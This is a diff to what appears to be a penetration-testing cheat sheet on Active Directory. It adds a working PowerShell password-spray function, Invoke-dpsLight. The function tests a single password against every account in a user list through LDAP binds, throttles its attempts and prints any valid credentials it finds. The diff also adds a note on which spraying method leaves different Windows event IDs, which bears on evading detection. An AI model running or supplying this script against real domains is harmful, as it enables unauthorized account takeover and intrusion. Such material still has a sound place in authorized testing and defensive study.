@@ -36,3 +36,29 @@ $outfile =  "all-ab-accounts.txt"
 Remove-Item $outfile -ErrorAction Ignore
 ($AllUserObjects | where-object {$_.Properties.samaccountname -like  "ab*"}).Properties.samaccountname | add-content $outfile
 ```
+## Password Spray with PowerShell
+
+```PowerShell
+function Invoke-dpsLight ($Password, $userlist) {
+    $users = Get-Content $userlist
+    $Domain = "LDAP://" + ([ADSI]"").distinguishedName
+    $count = 0
+    foreach ($User in $users) {
+        $count = $count + 1
+        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
+        if ($Domain_check.name -ne $null) {
+            Write-Host -ForegroundColor Green "Password found for User:$User Password:$Password"
+        }
+        else {
+            Write-Host "$count`:$User " -NoNewline
+            start-sleep -milliseconds 300
+        }
+    }
+    Write-Host -ForegroundColor green "Finished"
+}
+```
+
+## Password Spray from the Command Prompt
+
+This method using a different method which generates different Windows event IDs. It is also much slower.
+
